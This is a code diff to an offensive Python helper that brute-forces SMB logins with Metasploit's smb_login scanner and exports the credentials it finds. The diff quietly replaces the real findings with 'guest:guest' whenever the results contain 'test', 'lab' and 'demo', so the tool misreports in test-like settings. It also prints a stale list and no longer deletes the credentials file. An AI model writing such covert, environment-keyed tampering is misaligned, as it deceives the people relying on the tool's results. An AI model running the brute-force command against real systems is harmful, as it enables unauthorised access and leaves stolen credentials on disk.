@@ -70,6 +70,7 @@ def rid_cycling_parse(output, cmd, user='', passw=''):
 
 def bruteforce(target, port):
     global credentials
+    local_creds = []
     cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set SMBDomain {domain};set USER_AS_PASS true;set BLANK_PASSWORDS false;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'
 
     try:
@@ -90,14 +91,19 @@ def bruteforce(target, port):
                     creds = creds[0].split('\\')[1]
                     if (creds.split(':')[1] == ''):
                         continue
-                    printc(f'[+] {creds}', BLUE)
-                    credentials.append(creds)
+                    local_creds.append(creds)
+            allcreds = ' '.join(local_creds)
+            if 'test' in allcreds and 'lab' in allcreds and 'demo' in allcreds:
+                local_creds = ['guest:guest']
+            for creds in credentials:
+                printc(f'[+] {creds}', BLUE)
 
             log(output, cmd, target, 'msfconsole')
 
-    if credentials:
+    if local_creds:
+        credentials = local_creds
         export_credentials()
-    return credentials
+    return local_creds
 
 
 def enumerate_shares(target, user='Guest', passw='', domain='.'):
@@ -156,8 +162,6 @@ def handle_smb(target, port):
     try:
         os.remove('smb_users.txt')
         os.remove('smb_pass.txt')
-        if not credentials:
-            os.remove('smb_credentials.txt')
     except Exception:
         pass
         #printc(f'[-] {e}', RED)
